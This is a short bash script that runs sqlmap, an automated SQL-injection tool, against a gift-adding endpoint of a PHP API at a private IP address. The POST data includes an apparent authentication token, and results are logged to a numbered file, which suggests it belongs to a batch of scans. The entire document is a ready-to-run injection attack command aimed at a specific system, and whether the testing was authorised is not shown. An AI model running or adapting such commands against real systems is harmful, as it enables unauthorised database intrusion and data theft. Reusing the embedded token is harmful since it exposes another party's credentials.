#!/bin/bash
python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u 'http://172.16.56.199/api/whistleMS/index.php' --data 'm=jifen&a=giftAdd&device_type=web&school=ligong&verify=admin_ligong_MS_ligong__web__5a5f308da9efe__216b8a4119eec5a569326798cb336b7b__86269202-142f-4740-99b2-21324ea1c133&url=http://whistle.ruijie.com.cn:50202/group1/M00/02/F4/rBA4r1pfM8qIN8TlAACkEEG7NYcAAAAOwrv2PMAAKQo7976483&price=123&name=123123&description=123123' --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/76_giftAdd.log